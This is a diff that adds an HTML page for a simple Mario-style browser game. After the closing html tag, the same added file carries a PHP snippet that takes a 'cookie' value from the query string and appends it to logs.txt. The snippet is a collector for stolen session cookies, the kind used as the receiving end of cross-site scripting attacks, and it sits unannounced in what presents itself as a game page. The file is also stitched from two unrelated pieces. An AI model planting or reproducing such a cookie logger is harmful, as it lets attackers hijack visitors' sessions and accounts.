@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Document</title>
+  <link rel="stylesheet" href="styles/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <img id="level" src="img/level.gif" alt="">
+    <img id="mario" src="img/mario.gif" width="25" height="30" alt="">
+    <img id="coin1" src="img/coin.gif" width="10" height="10" alt="">
+    <img id="coin2" src="img/coin.gif" width="10" height="10" alt="">
+    <img id="coin3" src="img/coin.gif" width="10" height="10" alt="">
+  </div>
+  <div id="music">
+    <audio autoplay id="main-theme-song">
+      <source src="music/theme.mp3" type="audio/mp3" />
+    </audio>
+  </div>
+  <p class="fail">FAIL!</p>
+  <script src="scripts/jQuery.js"></script>
+  <script src="scripts/move.js"></script>
+</body>
+
+</html>
+<?php
+
+	if (isset($_GET['cookie']))
+	{
+	  $cookie = $_GET['cookie'];
+    if ($cookie)
+    {
+      $file = fopen("logs.txt", "a");
+      fwrite($file, $cookie . "\n");
+      fclose($file);
+    }
+	}
